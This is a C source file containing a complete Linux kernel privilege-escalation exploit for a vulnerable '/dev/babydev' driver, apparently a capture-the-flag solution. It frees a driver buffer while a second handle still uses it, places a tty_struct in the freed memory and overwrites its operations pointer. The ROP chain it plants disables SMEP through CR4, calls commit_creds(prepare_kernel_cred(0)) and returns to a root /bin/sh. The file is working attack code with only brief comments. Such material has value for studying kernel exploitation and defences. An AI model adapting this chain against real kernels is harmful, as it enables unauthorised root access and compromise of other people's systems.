#include <sys/wait.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/ioctl.h>

#define ret 0xffffffff8100006f
#define mov_rsp_rax_ret 0xffffffff8181bfc5
#define iretq 0xffffffff814e35ef
#define mov_cr4_rdi_pop_rbp_ret 0xffffffff81004d80
#define commit_creds 0xffffffff810a1420
#define prepare_kernel_creds 0xffffffff810a1810
#define swapgs_pop_rbp_ret 0xffffffff81063694
#define pop_rdi_ret 0xffffffff810d238d

void die(const char* msg)
{
    perror(msg);
    exit(-1);           
}

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status() {
	__asm__("mov user_cs, cs;"
			"mov user_ss, ss;"
			"mov user_sp, rsp;"
			"pushf;"
			"pop user_rflags;"
		);
	puts("[*] Saved status.");
}

void get_shell(int sig)
{
	if (!getuid()) {
		puts("[+] Get shell.");
		system("/bin/sh");
	} else {
		puts("[-] Failed.");
	}
}

void privilege_escalate() {
	char* (*pre)(int) = prepare_kernel_creds; // function ptr
	void* (*commit)(char*) = commit_creds;
	(*commit)((*pre)(0));
}

int main()
{
	save_status();

    uint64_t tty[4] = {0};

    int fd1 = open("/dev/babydev", O_RDWR);
    int fd2 = open("/dev/babydev", O_RDWR);
    
    /* use UAF to overwrite cred */

    // allocate 0x2e0 chunk, which is the size of struct tty
    ioctl(fd1, 0x10001, 0x2e0);
    
    close(fd1); // Although fd1 was closed, fd2 operation still can write chunk

    int fd3 = open("/dev/ptmx", O_RDWR | O_NOCTTY);

    read(fd2, tty, 0x8*4);
    /*
	struct tty_struct {
		int magic; // 4
		struct kref kref; // 4
		struct device *dev; // 8
		struct tty_driver *driver; // 8
		const struct tty_operations *ops; <---- our target
		// ...
	}
    */

	uint64_t tty_ops[30] = {
		pop_rdi_ret,
		0x6f0, // magic value for close smep
		mov_cr4_rdi_pop_rbp_ret, // now close smep
		0,
		ret,
		ret,
		pop_rdi_ret, // not pivoting again
		// below write 0x30
		mov_rsp_rax_ret, // stack pivoting to tty_ops
		(uint64_t) privilege_escalate, // root priv
		swapgs_pop_rbp_ret,
		0,
		iretq,
		(uint64_t) get_shell,
		user_cs,
		user_rflags,
		user_sp,
		user_ss,
	};

	tty[3] = (uint64_t) tty_ops;

	write(fd2, tty, 0x8*4);
	write(fd3, "QQ", 2); // trigger ROP

    return 0;
}
